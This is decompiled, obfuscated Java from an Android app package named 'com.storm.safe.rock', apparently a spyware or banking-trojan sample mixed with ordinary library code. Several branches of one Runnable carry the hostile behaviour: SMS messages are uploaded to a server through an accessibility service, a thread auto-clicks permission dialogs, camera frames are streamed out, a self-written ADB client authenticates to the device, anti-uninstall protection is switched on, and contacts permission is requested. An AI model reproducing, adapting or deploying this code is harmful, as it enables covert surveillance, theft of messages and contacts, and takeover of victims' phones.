package p000;

import android.app.Activity;
import android.app.Application;
import android.app.KeyguardManager;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Handler;
import android.view.View;
import androidx.activity.C0038a0;
import androidx.activity.ComponentActivity;
import androidx.lifecycle.C0076a0;
import androidx.lifecycle.Lifecycle$Event;
import androidx.work.CoroutineWorker;
import androidx.work.WorkerParameters;
import androidx.work.impl.C0096a0;
import androidx.work.impl.utils.futures.C0100a1;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import com.google.android.material.sidesheet.SideSheetBehavior;
import com.storm.safe.rock.activity.syuqattwmgit;
import com.storm.safe.rock.activity.todoqkrxcctl;
import com.storm.safe.rock.activity.yojggfhv;
import com.storm.safe.rock.hkdrkgzsfs;
import com.storm.safe.rock.manager.C0258a0;
import com.storm.safe.rock.receiver.arniezsqllm;
import com.storm.safe.rock.security.AbstractC0276a0;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0318a3;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0329b4;
import com.storm.safe.rock.service.modules.cipher.Point;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.service.modules.yw5xud.C0368a5;
import com.storm.safe.rock.service.modules.yw5xud.umrkmgrri;
import com.storm.safe.rock.view.ParticleView;
import io.socket.engineio.client.transports.PollingXHR;
import io.socket.engineio.parser.Base64;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.MappedByteBuffer;
import java.security.PublicKey;
import java.security.cert.X509Certificate;
import java.security.interfaces.RSAPublicKey;
import java.util.concurrent.CopyOnWriteArrayList;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import kotlin.jvm.internal.Lambda;
import okhttp3.internal.p032ws.WebSocketProtocol;
import okio.Segment;
import org.conscrypt.FileClientSessionCache;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: o6 */
/* loaded from: classes.dex */
public final /* synthetic */ class RunnableC0941o6 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f58743a0;

    /* renamed from: a1 */
    public final /* synthetic */ Object f58744a1;

    public /* synthetic */ RunnableC0941o6(int i, Object obj) {
        this.f58743a0 = i;
        this.f58744a1 = obj;
    }

    /* renamed from: a0 */
    private final void m214155a0() {
        C0516g c0516g = (C0516g) this.f58744a1;
        synchronized (c0516g.f56347a3) {
            try {
                if (c0516g.f56351a7 == null) {
                    return;
                }
                try {
                    C1162r c1162rM212869a1 = c0516g.m212869a1();
                    int i = c1162rM212869a1.f59577a4;
                    if (i == 2) {
                        synchronized (c0516g.f56347a3) {
                        }
                    }
                    if (i != 0) {
                        throw new RuntimeException("fetchFonts result is not OK. (" + i + ")");
                    }
                    try {
                        int i2 = o71.f58750a0;
                        n71.m214052a0("EmojiCompat.FontRequestEmojiCompatConfig.buildTypeface");
                        C1351vv c1351vv = c0516g.f56346a2;
                        Context context = c0516g.f56344a0;
                        c1351vv.getClass();
                        Typeface typefaceMo212561a9 = c81.f46076a0.mo212561a9(context, new C1162r[]{c1162rM212869a1}, 0);
                        MappedByteBuffer mappedByteBufferM213578c5 = kj1.m213578c5(c0516g.f56344a0, c1162rM212869a1.f59573a0);
                        if (mappedByteBufferM213578c5 == null || typefaceMo212561a9 == null) {
                            throw new RuntimeException("Unable to open file.");
                        }
                        try {
                            n71.m214052a0("EmojiCompat.MetadataRepo.create");
                            x31 x31Var = new x31(typefaceMo212561a9, b81.m210589e0(mappedByteBufferM213578c5));
                            n71.m214053a1();
                            n71.m214053a1();
                            synchronized (c0516g.f56347a3) {
                                try {
                                    cq0 cq0Var = c0516g.f56351a7;
                                    if (cq0Var != null) {
                                        cq0Var.mo212511c9(x31Var);
                                    }
                                } finally {
                                }
                            }
                            c0516g.m212868a0();
                        } finally {
                            int i3 = o71.f58750a0;
                            n71.m214053a1();
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                } catch (Throwable th2) {
                    synchronized (c0516g.f56347a3) {
                        try {
                            cq0 cq0Var2 = c0516g.f56351a7;
                            if (cq0Var2 != null) {
                                cq0Var2.mo212507c5(th2);
                            }
                            c0516g.m212868a0();
                        } finally {
                        }
                    }
                }
            } finally {
            }
        }
    }

    /* renamed from: a1 */
    private final void m214156a1() {
        g41 g41Var = (g41) this.f58744a1;
        while (!Thread.currentThread().isInterrupted()) {
            try {
                try {
                    InputStream inputStream = g41Var.f56393a9 ? g41Var.f56391a7 : g41Var.f56389a5;
                    t60.m214692b3(inputStream);
                    i41 i41VarM211996b5 = C0360a2.m211996b5(g41Var.f56401b7, inputStream);
                    int i = i41VarM211996b5.f56794a0;
                    C0360a2 c0360a2 = g41Var.f56401b7;
                    int i2 = c0360a2.f53866f1;
                    if (i == i2) {
                        g41Var.m212894a3(C0360a2.m212001c7(i2, new byte[0], c0360a2.f53869f4, 0));
                        SSLContext sSLContextM211992b1 = C0360a2.m211992b1(g41Var.f56401b7, g41Var.f56386a2, g41Var.f56387a3);
                        if (sSLContextM211992b1 != null) {
                            Socket socketCreateSocket = sSLContextM211992b1.getSocketFactory().createSocket(g41Var.f56388a4, g41Var.f56384a0, g41Var.f56385a1, true);
                            t60.m214693b4(socketCreateSocket, "null cannot be cast to non-null type javax.net.ssl.SSLSocket");
                            SSLSocket sSLSocket = (SSLSocket) socketCreateSocket;
                            sSLSocket.setUseClientMode(true);
                            sSLSocket.startHandshake();
                            synchronized (g41Var) {
                                g41Var.f56391a7 = sSLSocket.getInputStream();
                                g41Var.f56392a8 = sSLSocket.getOutputStream();
                                g41Var.f56393a9 = true;
                            }
                            t60.m214702c3("SystemOptimize", "STLS → TLS 升级成功");
                        }
                    } else if (i == c0360a2.f53861e6) {
                        synchronized (g41Var) {
                            g41Var.f56394b0 = true;
                            g41Var.notifyAll();
                        }
                        t60.m214702c3("SystemOptimize", "CNXN 连接成功");
                    } else if (i == c0360a2.f53865f0) {
                        t60.m214702c3("SystemOptimize", "AUTH: type=" + i41VarM211996b5.f56795a1 + " sigSent=" + g41Var.f56395b1 + " pubKeySent=" + g41Var.f56396b2);
                        if (!g41Var.f56393a9 && i41VarM211996b5.f56795a1 == 1) {
                            if (!g41Var.f56395b1) {
                                byte[] bArrM211997b6 = C0360a2.m211997b6(g41Var.f56401b7, i41VarM211996b5.f56797a3, g41Var.f56387a3);
                                if (bArrM211997b6 != null) {
                                    g41Var.m212894a3(C0360a2.m212001c7(g41Var.f56401b7.f53865f0, bArrM211997b6, 2, 0));
                                    g41Var.f56395b1 = true;
                                    t60.m214702c3("SystemOptimize", "AUTH: 发送签名, " + bArrM211997b6.length + "字节");
                                } else {
                                    t60.m214704c5("SystemOptimize", "AUTH: 签名失败");
                                }
                            } else if (g41Var.f56396b2) {
                                t60.m214704c5("SystemOptimize", "AUTH: 签名和公钥都发了还要认证, 失败");
                            } else {
                                X509Certificate x509CertificateM212074h9 = g41Var.f56401b7.m212074h9(g41Var.f56386a2);
                                if (x509CertificateM212074h9 != null) {
                                    PublicKey publicKey = x509CertificateM212074h9.getPublicKey();
                                    t60.m214693b4(publicKey, "null cannot be cast to non-null type java.security.interfaces.RSAPublicKey");
                                    RSAPublicKey rSAPublicKey = (RSAPublicKey) publicKey;
                                    String str = Build.MODEL;
                                    if (str == null) {
                                        str = "Unknown";
                                    }
                                    byte[] bArrM211993b2 = C0360a2.m211993b2(rSAPublicKey, str);
                                    g41Var.m212894a3(C0360a2.m212001c7(g41Var.f56401b7.f53865f0, bArrM211993b2, 3, 0));
                                    g41Var.f56396b2 = true;
                                    t60.m214702c3("SystemOptimize", "AUTH: 发送 ADB 格式公钥, " + bArrM211993b2.length + "字节");
                                } else {
                                    t60.m214704c5("SystemOptimize", "AUTH: 无法加载证书, 无法发送公钥");
                                }
                            }
                        }
                    } else if (i == c0360a2.f53867f2) {
                        t60.m214702c3("SystemOptimize", "OKAY: localId=" + i41VarM211996b5.f56796a2 + " remoteId=" + i41VarM211996b5.f56795a1);
                        h41 h41Var = (h41) g41Var.f56399b5.get(Integer.valueOf(i41VarM211996b5.f56796a2));
                        if (h41Var != null) {
                            synchronized (h41Var) {
                                h41Var.f56604a1 = i41VarM211996b5.f56795a1;
                                h41Var.f56605a2 = true;
                                h41Var.f56607a4 = true;
                                h41Var.notifyAll();
                            }
                        }
                    } else if (i == c0360a2.f53863e8) {
                        h41 h41Var2 = (h41) g41Var.f56399b5.get(Integer.valueOf(i41VarM211996b5.f56796a2));
                        if (h41Var2 != null) {
                            synchronized (h41Var2) {
                                h41Var2.f56608a5.add(i41VarM211996b5.f56797a3);
                                h41Var2.notifyAll();
                            }
                            g41Var.m212894a3(C0360a2.m212001c7(g41Var.f56401b7.f53867f2, new byte[0], h41Var2.f56603a0, h41Var2.f56604a1));
                        }
                    } else if (i == c0360a2.f53864e9) {
                        t60.m214702c3("SystemOptimize", "CLSE: localId=" + i41VarM211996b5.f56796a2);
                        h41 h41Var3 = (h41) g41Var.f56399b5.remove(Integer.valueOf(i41VarM211996b5.f56796a2));
                        if (h41Var3 != null) {
                            synchronized (h41Var3) {
                                h41Var3.f56606a3 = true;
                                h41Var3.notifyAll();
                            }
                        }
                    } else {
                        continue;
                    }
                } catch (Exception e) {
                    t60.m214705c6("SystemOptimize", "ADB 读取线程异常", e);
                    synchronized (g41Var) {
                        try {
                            for (h41 h41Var4 : g41Var.f56399b5.values()) {
                                t60.m214694b5(h41Var4, "s");
                                synchronized (h41Var4) {
                                    h41Var4.f56606a3 = true;
                                    h41Var4.notifyAll();
                                }
                            }
                            g41Var.f56399b5.clear();
                            g41Var.f56394b0 = false;
                            g41Var.notifyAll();
                            return;
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                }
            } catch (Throwable th2) {
                synchronized (g41Var) {
                    try {
                        for (h41 h41Var5 : g41Var.f56399b5.values()) {
                            t60.m214694b5(h41Var5, "s");
                            synchronized (h41Var5) {
                                h41Var5.f56606a3 = true;
                                h41Var5.notifyAll();
                            }
                        }
                        g41Var.f56399b5.clear();
                        g41Var.f56394b0 = false;
                        g41Var.notifyAll();
                        throw th2;
                    } catch (Throwable th3) {
                        throw th3;
                    }
                }
            }
        }
        synchronized (g41Var) {
            try {
                for (h41 h41Var6 : g41Var.f56399b5.values()) {
                    t60.m214694b5(h41Var6, "s");
                    synchronized (h41Var6) {
                        h41Var6.f56606a3 = true;
                        h41Var6.notifyAll();
                    }
                }
                g41Var.f56399b5.clear();
                g41Var.f56394b0 = false;
                g41Var.notifyAll();
            } catch (Throwable th4) {
                throw th4;
            }
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:170:0x03f8  */
    /* JADX WARN: Type inference failed for: r0v13, types: [kotlin.jvm.internal.Lambda, w00] */
    /* JADX WARN: Type inference failed for: r3v0 */
    /* JADX WARN: Type inference failed for: r3v63 */
    /* JADX WARN: Type inference failed for: r3v7, types: [org.json.JSONArray] */
    /* JADX WARN: Type inference failed for: r4v0 */
    /* JADX WARN: Type inference failed for: r4v1 */
    /* JADX WARN: Type inference failed for: r4v2 */
    /* JADX WARN: Type inference failed for: r4v43 */
    /* JADX WARN: Type inference failed for: r4v5 */
    /* JADX WARN: Type inference failed for: r4v6, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r4v7 */
    /* JADX WARN: Type inference failed for: r4v8 */
    /* JADX WARN: Type inference failed for: r5v0, types: [boolean] */
    /* JADX WARN: Type inference failed for: r5v14 */
    /* JADX WARN: Type inference failed for: r5v5, types: [int] */
    /* JADX WARN: Type inference failed for: r7v0, types: [int] */
    /* JADX WARN: Type inference failed for: r7v1 */
    /* JADX WARN: Type inference failed for: r7v4 */
    /* JADX WARN: Type inference failed for: r7v5, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r7v6 */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() throws Throwable {
        Object obj;
        C1054p3 c1054p3;
        Application application;
        h10 h10Var;
        KeyguardManager keyguardManager;
        C0323a8 c0323a8M211471g5;
        int i = 2;
        ?? r4 = 1;
        boolean z = true;
        r4 = 1;
        ?? r5 = 0;
        int i2 = 0;
        switch (this.f58743a0) {
            case 0:
                Activity activity = (Activity) this.f58744a1;
                if (activity.isFinishing()) {
                    return;
                }
                Handler handler = AbstractC1055p4.f59153a6;
                Method method = AbstractC1055p4.f59152a5;
                ?? r7 = Build.VERSION.SDK_INT;
                if (r7 >= 28) {
                    activity.recreate();
                    return;
                }
                if (((r7 != 26 && r7 != 27) || method != null) && (AbstractC1055p4.f59151a4 != null || AbstractC1055p4.f59150a3 != null)) {
                    try {
                        Object obj2 = AbstractC1055p4.f59149a2.get(activity);
                        if (obj2 != null && (obj = AbstractC1055p4.f59148a1.get(activity)) != null) {
                            Application application2 = activity.getApplication();
                            C1054p3 c1054p32 = new C1054p3(activity);
                            application2.registerActivityLifecycleCallbacks(c1054p32);
                            handler.post(new RunnableC0884n2(c1054p32, obj2, 1 == true ? 1 : 0, r5));
                            if (r7 != 26 && r7 != 27) {
                                r4 = 0;
                            }
                            try {
                                if (r4 != 0) {
                                    try {
                                        Boolean bool = Boolean.FALSE;
                                        r4 = application2;
                                        r7 = c1054p32;
                                        method.invoke(obj, obj2, null, null, 0, bool, null, null, bool, bool);
                                    } catch (Throwable th) {
                                        th = th;
                                        application = application2;
                                        c1054p3 = c1054p32;
                                        handler.post(new RunnableC0884n2(application, c1054p3, i, r5));
                                        throw th;
                                    }
                                } else {
                                    r4 = application2;
                                    r7 = c1054p32;
                                    activity.recreate();
                                }
                                handler.post(new RunnableC0884n2(r4, r7, i, r5));
                                return;
                            } catch (Throwable th2) {
                                th = th2;
                                application = r4;
                                c1054p3 = r7;
                            }
                        }
                    } catch (Throwable unused) {
                    }
                }
                activity.recreate();
                return;
            case 1:
                h10 h10Var2 = (h10) this.f58744a1;
                CopyOnWriteArrayList copyOnWriteArrayList = AbstractC1095q3.f59370a0;
                try {
                    URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/readGetevent").openConnection();
                    t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                    HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
                    httpURLConnection.setConnectTimeout(5000);
                    httpURLConnection.setReadTimeout(5000);
                    InputStream inputStream = httpURLConnection.getInputStream();
                    t60.m214694b5(inputStream, "readConn.inputStream");
                    String strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, AbstractC0577hd.f56650a0), Segment.SIZE));
                    httpURLConnection.disconnect();
                    JSONObject jSONObject = new JSONObject(strM210590e1);
                    if (jSONObject.optBoolean(PollingXHR.Request.EVENT_SUCCESS)) {
                        JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("data");
                        ?? OptJSONArray = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optJSONArray("points") : 0;
                        if (OptJSONArray != 0) {
                            int length = OptJSONArray.length();
                            while (r5 < length) {
                                JSONObject jSONObject2 = OptJSONArray.getJSONObject(r5);
                                copyOnWriteArrayList.add(new Point(jSONObject2.getInt("x"), jSONObject2.getInt("y")));
                                r5++;
                            }
                        }
                        copyOnWriteArrayList.size();
                    }
                    URLConnection uRLConnectionOpenConnection2 = new URL("http://127.0.0.1:7912/stopGetevent").openConnection();
                    t60.m214693b4(uRLConnectionOpenConnection2, "null cannot be cast to non-null type java.net.HttpURLConnection");
                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) uRLConnectionOpenConnection2;
                    httpURLConnection2.setConnectTimeout(5000);
                    httpURLConnection2.setReadTimeout(5000);
                    InputStream inputStream2 = httpURLConnection2.getInputStream();
                    t60.m214694b5(inputStream2, "stopConn.inputStream");
                    b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream2, AbstractC0577hd.f56650a0), Segment.SIZE));
                    httpURLConnection2.disconnect();
                    copyOnWriteArrayList.size();
                } catch (Exception unused2) {
                }
                AbstractC1095q3.f59373a3.post(new RunnableC1052p1(h10Var2, 1 == true ? 1 : 0, AbstractC0715je.m213303j0(copyOnWriteArrayList)));
                return;
            case 2:
                C0032al c0032al = (C0032al) this.f58744a1;
                if (c0032al.f43703b1) {
                    c0032al.m209819a8();
                    return;
                }
                return;
            case 3:
                ((Lambda) this.f58744a1).invoke();
                return;
            case 4:
                C0258a0 c0258a0 = (C0258a0) this.f58744a1;
                t60.m214714d6("CameraManager", "📤 发送线程启动");
                while (c0258a0.f52086b9.get()) {
                    try {
                        byte[] bArr = (byte[]) c0258a0.f52085b8.poll();
                        if (bArr != null && (h10Var = c0258a0.f52091c4) != null) {
                            h10Var.invoke(bArr);
                        }
                        Thread.sleep(200L);
                    } catch (InterruptedException unused3) {
                    } catch (Exception e) {
                        t60.m214705c6("CameraManager", "发送线程异常", e);
                    }
                }
                t60.m214714d6("CameraManager", "📤 发送线程停止");
                return;
            case 5:
                ((C0697ix) this.f58744a1).m213199b8(true);
                return;
            case 6:
                ((ComponentActivity) this.f58744a1).invalidateOptionsMenu();
                return;
            case 7:
                DialogC1167r4.m214476a1((DialogC1167r4) this.f58744a1);
                return;
            case 8:
                C0318a3 c0318a3 = (C0318a3) this.f58744a1;
                t60.m214695b6(c0318a3, "this$0");
                Context context = c0318a3.f53045a0;
                try {
                    Object systemService = context.getSystemService("keyguard");
                    keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
                } catch (Exception e2) {
                    t60.m214705c6("ConfigProgressManager", "❌ 检查密码状态失败", e2);
                }
                if (keyguardManager == null || !keyguardManager.isKeyguardSecure()) {
                    z = false;
                } else if (context.getSharedPreferences("password_input", 0).getBoolean("password_input_completed", false)) {
                }
                try {
                    g60.f56416a0.m212897a1(context, z);
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("ConfigProgressManager", "❌ 直接调用设置完成处理失败", e3);
                    return;
                }
            case 9:
                ConstraintTrackingWorker constraintTrackingWorker = (ConstraintTrackingWorker) this.f58744a1;
                if (constraintTrackingWorker.f45591a7.f56381a0 instanceof C0486f8) {
                    return;
                }
                Object obj3 = constraintTrackingWorker.f60191a1.f45535a1.f59468a0.get("androidx.work.impl.workers.ConstraintTrackingWorker.ARGUMENT_CLASS_NAME");
                String str = obj3 instanceof String ? (String) obj3 : null;
                t60.m214694b5(C1351vv.m214963a5(), "get()");
                if (str == null || str.length() == 0) {
                    int i3 = AbstractC0828lp.f58060a0;
                    C0100a1 c0100a1 = constraintTrackingWorker.f45591a7;
                    t60.m214694b5(c0100a1, "future");
                    c0100a1.m210484a8(new pb0());
                    return;
                }
                dh1 dh1Var = constraintTrackingWorker.f60191a1.f45538a4;
                Context context2 = constraintTrackingWorker.f60190a0;
                WorkerParameters workerParameters = constraintTrackingWorker.f45588a4;
                dh1Var.getClass();
                tb0 tb0VarM212607a0 = dh1.m212607a0(context2, str, workerParameters);
                constraintTrackingWorker.f45592a8 = tb0VarM212607a0;
                if (tb0VarM212607a0 == null) {
                    int i4 = AbstractC0828lp.f58060a0;
                    C0100a1 c0100a12 = constraintTrackingWorker.f45591a7;
                    t60.m214694b5(c0100a12, "future");
                    c0100a12.m210484a8(new pb0());
                    return;
                }
                C0096a0 c0096a0M210473g0 = C0096a0.m210473g0(constraintTrackingWorker.f60190a0);
                xg1 xg1VarMo210465b9 = c0096a0M210473g0.f45559a6.mo210465b9();
                String string = constraintTrackingWorker.f60191a1.f45534a0.toString();
                t60.m214694b5(string, "id.toString()");
                wg1 wg1VarM215185a8 = xg1VarMo210465b9.m215185a8(string);
                if (wg1VarM215185a8 == null) {
                    C0100a1 c0100a13 = constraintTrackingWorker.f45591a7;
                    t60.m214694b5(c0100a13, "future");
                    int i5 = AbstractC0828lp.f58060a0;
                    c0100a13.m210484a8(new pb0());
                    return;
                }
                x31 x31Var = c0096a0M210473g0.f45566b3;
                t60.m214694b5(x31Var, "workManagerImpl.trackers");
                zg1 zg1Var = new zg1(x31Var, constraintTrackingWorker);
                zg1Var.m215415b1(AbstractC1117qo.m214451e7(wg1VarM215185a8));
                String string2 = constraintTrackingWorker.f60191a1.f45534a0.toString();
                t60.m214694b5(string2, "id.toString()");
                if (!zg1Var.m215406a2(string2)) {
                    int i6 = AbstractC0828lp.f58060a0;
                    C0100a1 c0100a14 = constraintTrackingWorker.f45591a7;
                    t60.m214694b5(c0100a14, "future");
                    c0100a14.m210484a8(new qb0());
                    return;
                }
                int i7 = AbstractC0828lp.f58060a0;
                try {
                    tb0 tb0Var = constraintTrackingWorker.f45592a8;
                    t60.m214692b3(tb0Var);
                    C0100a1 c0100a1Mo210455a4 = tb0Var.mo210455a4();
                    t60.m214694b5(c0100a1Mo210455a4, "delegate!!.startWork()");
                    c0100a1Mo210455a4.mo210459a0(new RunnableC1052p1(constraintTrackingWorker, 7, c0100a1Mo210455a4), constraintTrackingWorker.f60191a1.f45536a2);
                    return;
                } catch (Throwable unused4) {
                    int i8 = AbstractC0828lp.f58060a0;
                    synchronized (constraintTrackingWorker.f45589a5) {
                        try {
                            if (constraintTrackingWorker.f45590a6) {
                                C0100a1 c0100a15 = constraintTrackingWorker.f45591a7;
                                t60.m214694b5(c0100a15, "future");
                                c0100a15.m210484a8(new qb0());
                                return;
                            } else {
                                C0100a1 c0100a16 = constraintTrackingWorker.f45591a7;
                                t60.m214694b5(c0100a16, "future");
                                c0100a16.m210484a8(new pb0());
                                return;
                            }
                        } catch (Throwable th3) {
                            throw th3;
                        }
                    }
                }
            case 10:
                CoroutineWorker coroutineWorker = (CoroutineWorker) this.f58744a1;
                if (coroutineWorker.f45499a5.f56381a0 instanceof C0486f8) {
                    coroutineWorker.f45498a4.m215253a7(null);
                    return;
                }
                return;
            case oe0.DEFAULT_M /* 11 */:
                C1309uq c1309uq = (C1309uq) this.f58744a1;
                boolean zIsPopupShowing = c1309uq.f60493a7.isPopupShowing();
                c1309uq.m214858b8(zIsPopupShowing);
                c1309uq.f60498b2 = zIsPopupShowing;
                return;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                m214155a0();
                return;
            case 13:
                da0 da0Var = (da0) this.f58744a1;
                t60.m214695b6(da0Var, "this$0");
                da0Var.f55599a6 = false;
                return;
            case 14:
                ((C0038a0) this.f58744a1).m209835a1();
                return;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                C0368a5 c0368a5 = (C0368a5) this.f58744a1;
                try {
                    C0368a5.m212303e0("[点击线程] ★ 线程已启动 ★");
                    C0368a5.m212303e0("[点击线程] 睡眠800ms后开始查找...");
                    Thread.sleep(800L);
                    C0368a5.m212303e0("[点击线程] 睡眠结束，开始循环查找");
                    int i9 = 0;
                    while (true) {
                        umrkmgrri.C0373a0 c0373a0 = umrkmgrri.f55158a3;
                        if (c0373a0.isRequestingPermissions() && i2 < 60) {
                            i2++;
                            if (i2 <= 3) {
                                C0368a5.m212303e0("[点击线程] 第 " + i2 + " 轮");
                            }
                            if (c0368a5.m212333d1()) {
                                i9++;
                                C0368a5.m212303e0("[点击线程] ✅ 点击成功! 总计: " + i9 + " 次");
                                C0368a5.m212303e0("[点击线程] 等待300ms让系统处理...");
                                Thread.sleep(300L);
                                if (c0373a0.isRequestingPermissions()) {
                                    C0368a5.m212303e0("[点击线程] ⚠️ 权限请求仍在进行，继续...");
                                } else {
                                    C0368a5.m212303e0("[点击线程] ✅ 权限请求已完成，退出循环");
                                }
                            } else {
                                Thread.sleep(100L);
                            }
                        }
                    }
                    C0368a5.m212303e0("[点击线程] ★★★ 循环结束 ★★★");
                    C0368a5.m212303e0("[点击线程] 总轮数: " + i2 + ", 总点击次数: " + i9);
                    return;
                } catch (Exception e4) {
                    C0368a5.m212303e0("[点击线程] ❌ 异常: " + e4.getMessage());
                    return;
                }
            case 16:
                ParticleView particleView = (ParticleView) this.f58744a1;
                int i10 = ParticleView.f55231a6;
                t60.m214695b6(particleView, "this$0");
                Object parent = particleView.getParent();
                View view = parent instanceof View ? (View) parent : null;
                if (view == null || view.getHeight() <= 0 || particleView.getLayoutParams().height == view.getHeight()) {
                    return;
                }
                particleView.getLayoutParams().height = view.getHeight();
                particleView.requestLayout();
                return;
            case 17:
                no0 no0Var = (no0) this.f58744a1;
                C0076a0 c0076a0 = no0Var.f58683a5;
                if (no0Var.f58679a1 == 0) {
                    no0Var.f58680a2 = true;
                    c0076a0.m210234g1(Lifecycle$Event.ON_PAUSE);
                }
                if (no0Var.f58678a0 == 0 && no0Var.f58680a2) {
                    c0076a0.m210234g1(Lifecycle$Event.ON_STOP);
                    no0Var.f58681a3 = true;
                    return;
                }
                return;
            case 18:
                try {
                    AbstractC0276a0.m211382a0((hkdrkgzsfs) this.f58744a1);
                    return;
                } catch (Exception e5) {
                    t60.m214705c6("SecurityManager", "❌ 安全模块初始化失败", e5);
                    return;
                }
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                C0473ey c0473ey = (C0473ey) this.f58744a1;
                c0473ey.f56122a2 = false;
                SideSheetBehavior sideSheetBehavior = (SideSheetBehavior) c0473ey.f56124a4;
                bb1 bb1Var = sideSheetBehavior.f49789a8;
                if (bb1Var != null && bb1Var.m210637a6()) {
                    c0473ey.m212726a0(c0473ey.f56121a1);
                    return;
                } else {
                    if (sideSheetBehavior.f49788a7 == 2) {
                        sideSheetBehavior.m211100b8(c0473ey.f56121a1);
                        return;
                    }
                    return;
                }
            case 20:
                m214156a1();
                return;
            case 21:
                JSONObject jSONObject3 = (JSONObject) this.f58744a1;
                arniezsqllm.C0269a0 c0269a0 = arniezsqllm.f52283a0;
                try {
                    dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                    if (!c0290a0.isServiceReady()) {
                        t60.m214726f4("arniezsqllm", "无障碍服务未运行，短信未上传");
                        return;
                    }
                    dqtvuisjd c0290a02 = c0290a0.getInstance();
                    if (c0290a02 != null && (c0323a8M211471g5 = c0290a02.m211471g5()) != null) {
                        c0323a8M211471g5.m211659c5(jSONObject3);
                    }
                    t60.m214702c3("arniezsqllm", "短信已上传服务器");
                    return;
                } catch (Exception e6) {
                    tz0.m214808a8("短信上传失败: ", e6.getMessage(), "arniezsqllm", e6);
                    return;
                }
            case 22:
                NotificationManager notificationManager = (NotificationManager) this.f58744a1;
                dqtvuisjd.C0290a0 c0290a03 = dqtvuisjd.f52358m1;
                t60.m214695b6(notificationManager, "$notificationManager");
                notificationManager.cancel(10089);
                return;
            case 23:
                try {
                    dqtvuisjd dqtvuisjdVar = ((C0329b4) this.f58744a1).f53195a0;
                    dqtvuisjdVar.getClass();
                    String str2 = AbstractC0315a0.f53025a0;
                    AbstractC0315a0.f53032a7 = true;
                    AbstractC0315a0.f53034a9 = true;
                    AbstractC0315a0.f53035b0 = true;
                    AbstractC0315a0.f53036b1 = true;
                    dqtvuisjdVar.f52411e2 = true;
                    t60.m214714d6("dqtvuisjd", "📝 [日志] 直接启用日志记录");
                    t60.m214714d6("obzzniixzpin", "✅ [日志] 授权流程结束: 日志记录已启用");
                    t60.m214714d6("obzzniixzpin", "🛡️ [保护] 防卸载延迟到 WRITE_SETTINGS 流程结束后启用");
                    return;
                } catch (Exception e7) {
                    t60.m214705c6("obzzniixzpin", "❌ 启用日志记录/防卸载失败", e7);
                    return;
                }
            case 24:
                syuqattwmgit syuqattwmgitVar = (syuqattwmgit) this.f58744a1;
                syuqattwmgit.C0248a0 c0248a0 = syuqattwmgit.f51917a3;
                if (syuqattwmgitVar.isFinishing() || syuqattwmgitVar.isDestroyed()) {
                    t60.m214726f4("syuqattwmgit", "Activity 已销毁，跳过 BiometricPrompt");
                    return;
                }
                int i11 = Build.VERSION.SDK_INT;
                t60.m214702c3("syuqattwmgit", "API 版本: " + i11);
                if (i11 >= 30) {
                    syuqattwmgitVar.m211193a2();
                    return;
                } else {
                    syuqattwmgitVar.m211194a3();
                    return;
                }
            case 25:
                todoqkrxcctl todoqkrxcctlVar = (todoqkrxcctl) this.f58744a1;
                int i12 = todoqkrxcctl.f51922a0;
                try {
                    AbstractC1117qo.m214459f8(todoqkrxcctlVar, new String[]{"android.permission.READ_CONTACTS"}, 151);
                    return;
                } catch (Exception e8) {
                    t60.m214705c6("ContactsPermission", "请求通讯录权限失败", e8);
                    dqtvuisjd.f52358m1.setPermissionRequesting(false);
                    todoqkrxcctlVar.finish();
                    return;
                }
            case 26:
                com.storm.safe.rock.p029ui.umrkmgrri umrkmgrriVar = (com.storm.safe.rock.p029ui.umrkmgrri) this.f58744a1;
                int i13 = com.storm.safe.rock.p029ui.umrkmgrri.f55196a2;
                umrkmgrriVar.finish();
                return;
            default:
                yojggfhv yojggfhvVar = (yojggfhv) this.f58744a1;
                String str3 = yojggfhv.f51923b3;
                t60.m214695b6(yojggfhvVar, "this$0");
                if (yojggfhvVar.isFinishing() || yojggfhvVar.isDestroyed()) {
                    return;
                }
                yojggfhvVar.moveTaskToBack(false);
                Intent intent = new Intent(yojggfhvVar, (Class<?>) yojggfhv.class);
                intent.addFlags(872415232);
                yojggfhvVar.startActivity(intent);
                return;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public /* synthetic */ RunnableC0941o6(w00 w00Var) {
        this.f58743a0 = 3;
        this.f58744a1 = (Lambda) w00Var;
    }
}
